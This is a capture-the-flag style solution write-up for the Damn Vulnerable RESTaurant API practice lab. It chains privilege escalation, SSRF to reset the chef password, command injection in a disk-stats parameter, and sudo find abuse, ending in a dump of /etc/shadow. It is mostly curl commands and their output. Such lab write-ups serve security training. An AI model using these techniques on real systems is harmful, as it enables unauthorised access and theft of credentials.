# DV-RESTaurant-API-Game-Solution
# First we review the /docs endpoint for goodies
Attempt a few calls without auth just to see what we can do and what the responses are.  Quickly realize for any fun we need to authenticate.  Next we move onto creating a user.

## create a user
```bash
curl -X POST http://192.168.1.2:8089/register \
     -H "Content-Type: application/json" \
     -d '{
           "username": "testuser",
           "password": "securepassword123",
           "first_name": "Test",
           "last_name": "User",
           "phone_number": "1234567890"
         }'
		 
{"username":"testuser","first_name":"Test","last_name":"User","phone_number":"1234567890","role":"Customer"}
```

### fetch token
```bash
curl -X POST http://192.168.1.2:8089/token \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=testuser&password=securepassword123"

{"access_token":"${TOKEN}","token_type":"bearer"}
```

### authenticate
```bash
curl -X GET http://192.168.1.2:8089/profile \
     -H "Authorization: Bearer ${TOKEN}"
```

### get profile info
```bash
curl -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/profile

{"username":"testuser","first_name":"Test","last_name":"User","phone_number":"1234567890","role":"Customer"}
```

### hit the disk endpoint to see what type of response we get
```bash
curl -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/admin/stats/disk

{"detail":"Only Chef is authorized to get current disk stats!"}
```
Well that's specific

### attempt to update role for testuser to Chef
```bash
curl -X PUT http://192.168.1.2:8089/users/update_role \
     -H "Authorization: Bearer ${TOKEN}" \
     -H "Content-Type: application/json" \
     -d '{
           "username": "testuser",
           "role": "Chef"
         }'

{"detail":"Only Chef is authorized to add Chef role!"}
```
Fair enough but at least we tried

## At this point I jump to review the code for any goodies - [app/apis/users/service.py](https://github.com/theowni/Damn-Vulnerable-RESTaurant-API-Game/blob/main/app/apis/users/service.py#L18)
```
# this method allows staff to give Employee role to other users
# Chef role is restricted
```
This is great news!

### reviewed the code looks juicy - [app/apis/admin/service.py](https://github.com/theowni/Damn-Vulnerable-RESTaurant-API-Game/blob/main/app/apis/admin/service.py#L20)
```
"/admin/reset-chef-password"
```
Interesting......come back to this later

### attempt to update role from testuser to Employee just for kicks
```bash
curl -X PUT http://192.168.1.2:8089/users/update_role \
     -H "Authorization: Bearer ${TOKEN}" \
     -H "Content-Type: application/json" \
     -d '{
           "username": "testuser",
           "role": "Employee"
         }'

{"username":"testuser","role":"Employee"}
```
That worked, wow.

### validate role
```bash
curl -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/profile

{"username":"testuser","first_name":"Test","last_name":"User","phone_number":"1234567890","role":"Employee"}
```
Nice, we've gone from a general Customer role to Employee, sweet.

### attempt to update role for testuser from Employee to Chef cause why not
```bash
curl -X PUT http://192.168.1.2:8089/users/update_role \
     -H "Authorization: Bearer ${TOKEN}" \
     -H "Content-Type: application/json" \
     -d '{
           "username": "testuser",
           "role": "Chef"
         }'
{"detail":"Only Chef is authorized to add Chef role!"}
```
As expected...

## Circle back to previous findings and craft SSRF for the /menu endpoint to hit the local /admin/reset-chef-password
```bash
curl -X PUT http://192.168.1.2:8089/menu \
    -H "Authorization: Bearer ${TOKEN}" \
    -H "Content-Type: application/json" \
    -d '{
          "name": "Item",
          "price": 0.00,
          "category": "",
          "description": "",
          "image_url": "http://localhost:8080/admin/reset-chef-password"
        }'
		
{"id":15,"name":"Item","price":0.0,"category":"","description":"","image_base64":"eyJwYXNzd29yZCI6IjErN2p3KDZhSjRUcTFBWjZhOlh6X2VXWHRRIyNBcCh0In0="}
```

### decode the string
```bash
echo 'eyJwYXNzd29yZCI6IjErN2p3KDZhSjRUcTFBWjZhOlh6X2VXWHRRIyNBcCh0In0=' | base64 --decode
{"password":"1+7jw(6aJ4Tq1AZ6a:Xz_eWXtQ##Ap(t"}
```

### fetch token as Chef
```bash
curl -X POST http://192.168.1.2:8089/token \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=chef&password=1%2B7jw%286aJ4Tq1AZ6a%3AXz_eWXtQ%23%23Ap%28t"

{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjaGVmIiwiZXhwIjoxNzEzNTQwMTA1fQ.TQoVX_EOQKzIfjPwgJxxcGwVSfcge7QOVkNCny3wRvA","token_type":"bearer"}
```

### authenticate as Chef
```bash
curl -X GET http://192.168.1.2:8089/profile \
     -H "Authorization: Bearer ${CHEF_TOKEN}"	 
	 
{"username":"chef","first_name":"Gustavo","last_name":"","phone_number":"(505) 146-0195","role":"Chef"}
```
Promoted to Chef, not bad.

## attempt RCE via the /admin/stats/disk endpoint
```bash
curl -H "Authorization: Bearer ${CHEF_TOKEN}" http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26echo%20vulnerable%21
{"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm\nvulnerable!"}
```
So that works

### check for priv escalation opportunities
#### check if the "app" user has any sudo capabilities that can be exploited:
```bash
curl -H "Authorization: Bearer ${CHEF_TOKEN}" \
"http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20-l"
{"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm\nMatching Defaults entries for app on 1847d1ddb7e1:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser app may run the following commands on 1847d1ddb7e1:\n    (ALL) NOPASSWD: /usr/bin/find"}
```
:boom: "app" user has permission to run the /usr/bin/find command as root without a password (NOPASSWD). This is a banger of finding because the find command can be exploited to execute arbitrary commands with elevated privileges.

### create a garbage file under /root
```bash
curl -H "Authorization: Bearer ${CHEF_TOKEN}" \
"http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20/usr/bin/find%20/tmp%20-type%20f%20-exec%20/bin/sh%20-c%20'echo%20RCE%20test%20%3E%20/root/garbage.w00t'%20\\;"
{"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm"}
```

### validate garbage file creation

```bash
curl -H "Authorization: Bearer ${CHEF_TOKEN}" "http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20/usr/bin/find%20/tmp%20-type%20f%20-exec%20/bin/sh%20-c%20'ls%20/root'%20\\;"
{"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  138G   12G  93% /\n/dev/mapper/fedora-root  149G  138G   12G  93% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm\ngarbage.w00t\ngarbage.w00t\ngarbage.w00t"}

podman exec --user=root  damn-vulnerable-restaurant-api-game-web-1 ls /root/
total 24
drwx------.  2 root root  67 Apr 19 17:01 .
dr-xr-xr-x. 22 root root  63 Apr 19 16:42 ..
-rw-------.  1 root root  62 Apr 19 17:00 .bash_history
-rw-r--r--.  1 root root 570 Jan 31  2010 .bashrc
-rw-r--r--.  1 root root 148 Aug 17  2015 .profile
-rw-r--r--.  1 root root 254 Jun 13  2023 .wget-hsts
-rw-r--r--.  1 root root   9 Apr 19 17:01 garbage.w00t
```

### for good measure... :beer:
```bash
curl -H "Authorization: Bearer ${CHEF_TOKEN}" \
"http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20/usr/bin/find%20/tmp%20-type%20f%20-exec%20/bin/sh%20-c%20'cat%20/etc/shadow'%20\\;" | \
jq -r '.output'

Filesystem               Size  Used Avail Use% Mounted on
fuse-overlayfs           149G  138G   12G  93% /
/dev/mapper/fedora-root  149G  138G   12G  93% /app
tmpfs                     64M     0   64M   0% /dev
devtmpfs                 4.0M     0  4.0M   0% /dev/mem
tmpfs                    996M  1.2M  995M   1% /etc/hosts
shm                       63M     0   63M   0% /dev/shm
root:*:19520:0:99999:7:::
daemon:*:19520:0:99999:7:::
bin:*:19520:0:99999:7:::
sys:*:19520:0:99999:7:::
sync:*:19520:0:99999:7:::
games:*:19520:0:99999:7:::
man:*:19520:0:99999:7:::
lp:*:19520:0:99999:7:::
mail:*:19520:0:99999:7:::
news:*:19520:0:99999:7:::
uucp:*:19520:0:99999:7:::
proxy:*:19520:0:99999:7:::
www-data:*:19520:0:99999:7:::
backup:*:19520:0:99999:7:::
list:*:19520:0:99999:7:::
irc:*:19520:0:99999:7:::
gnats:*:19520:0:99999:7:::
nobody:*:19520:0:99999:7:::
_apt:*:19520:0:99999:7:::
app:!:19832:0:99999:7:::
root:*:19520:0:99999:7:::
daemon:*:19520:0:99999:7:::
bin:*:19520:0:99999:7:::
sys:*:19520:0:99999:7:::
sync:*:19520:0:99999:7:::
games:*:19520:0:99999:7:::
man:*:19520:0:99999:7:::
lp:*:19520:0:99999:7:::
mail:*:19520:0:99999:7:::
news:*:19520:0:99999:7:::
uucp:*:19520:0:99999:7:::
proxy:*:19520:0:99999:7:::
www-data:*:19520:0:99999:7:::
backup:*:19520:0:99999:7:::
list:*:19520:0:99999:7:::
irc:*:19520:0:99999:7:::
gnats:*:19520:0:99999:7:::
nobody:*:19520:0:99999:7:::
_apt:*:19520:0:99999:7:::
app:!:19832:0:99999:7:::
root:*:19520:0:99999:7:::
daemon:*:19520:0:99999:7:::
bin:*:19520:0:99999:7:::
sys:*:19520:0:99999:7:::
sync:*:19520:0:99999:7:::
games:*:19520:0:99999:7:::
man:*:19520:0:99999:7:::
lp:*:19520:0:99999:7:::
mail:*:19520:0:99999:7:::
news:*:19520:0:99999:7:::
uucp:*:19520:0:99999:7:::
proxy:*:19520:0:99999:7:::
www-data:*:19520:0:99999:7:::
backup:*:19520:0:99999:7:::
list:*:19520:0:99999:7:::
irc:*:19520:0:99999:7:::
gnats:*:19520:0:99999:7:::
nobody:*:19520:0:99999:7:::
_apt:*:19520:0:99999:7:::
app:!:19832:0:99999:7:::

```
```mermaid
graph TD;
    A[Register as Customer] --> B[Upgrade to Employee];
    B --> C[Craft SSRF attack via menu endpoint];
    C --> D[Reset and use Chef credentials];
    D --> E[Discover 'app' user sudo privileges];
    E --> F[Create file in /root via sudo find];
    F --> G[Check file creation in /root];
    G --> H[Dump /etc/shadow file];

    classDef default fill:#E67E22,stroke:#333,stroke-width:2px;
    class A,B,C,D,E,F,G,H default;
